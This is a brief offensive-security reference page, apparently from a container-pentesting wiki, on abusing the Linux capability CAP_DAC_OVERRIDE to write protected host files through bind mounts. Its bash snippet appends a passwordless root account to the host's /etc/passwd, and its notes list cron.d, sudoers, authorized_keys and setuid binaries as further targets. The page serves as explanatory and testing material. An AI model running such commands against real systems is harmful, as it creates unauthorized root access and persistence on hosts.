---
title: "CAP_DAC_OVERRIDE: writing protected host files from a container"
description: "Escaping or escalating from a container that holds CAP_DAC_OVERRIDE by writing host files whose permissions would otherwise deny it, turning any reachable host path, such as a bind mount, into a write primitive for cron, passwd, or a setuid binary."
keywords:
  - CAP_DAC_OVERRIDE
  - arbitrary file write
  - container escape
  - bind mount
  - linux capabilities
---

# CAP_DAC_OVERRIDE

`CAP_DAC_OVERRIDE` bypasses file write permission checks. It does not by itself cross the mount namespace, but wherever a host path is reachable (a bind mount, a mounted host device, `/proc/<pid>/root` with host `/proc`), it turns a read-only-by-permission target into a writable one.

```bash
capsh --print | grep -q cap_dac_override && echo have
# With any host path reachable, write despite ownership/mode
echo 'attacker:x:0:0::/root:/bin/sh' >> /host/etc/passwd
```

## Exploitation notes

- The capability is a force-multiplier for mounts: combine it with a [Host path mount](../../sensitive-mounts/host-path-mount.md) or a mounted host device to write files you could otherwise only read.
- Useful targets are `cron.d`, `passwd`, `sudoers`, and `authorized_keys`, or flipping a host binary to setuid.
- For reads rather than writes, see [CAP_DAC_READ_SEARCH](cap-dac-read-search.md).

## References

- [man 7 capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [man 2 open](https://man7.org/linux/man-pages/man2/open.2.html)
